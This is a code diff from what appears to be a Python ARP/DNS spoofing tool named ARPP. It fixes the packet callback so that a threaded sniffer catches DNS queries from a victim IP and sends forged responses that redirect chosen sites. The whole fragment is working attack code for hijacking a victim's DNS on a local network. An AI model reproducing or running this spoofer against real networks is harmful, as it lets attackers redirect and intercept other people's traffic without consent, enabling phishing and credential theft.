@@ -475,15 +475,15 @@ class ARPP(object):
         DPH = DNSPacketHandler(loc_dns, self.SELECTED_INTERFACE)
         
         # this function is called on each packet in the sniff call further ahead
-        def packet_callback():
-            return DPH.send_response
+        def packet_callback(packet):
+            return DPH.send_response(packet, target_sites_map)
                         
         # in order to keep the GUI running for the user of this script, we create a thread that executes the DNS spoofing
         # the threading.Event() is used to stop the thread when the user wants (by using e.set())
         e=threading.Event()
         def rec(event):
             while True:
-                sniff(timeout=3, filter="udp port 53 and ip src {}".format(ipVictim), prn=packet_callback(), count=10) # packet_callback(loc_dns) becomes send_spoofed_response and get packet as input making this code work 
+                sniff(timeout=3, filter="udp port 53 and ip src {}".format(ipVictim), prn=packet_callback, count=10) # packet_callback(loc_dns) becomes send_spoofed_response and get packet as input making this code work 
                 if event.is_set():
                     break
         
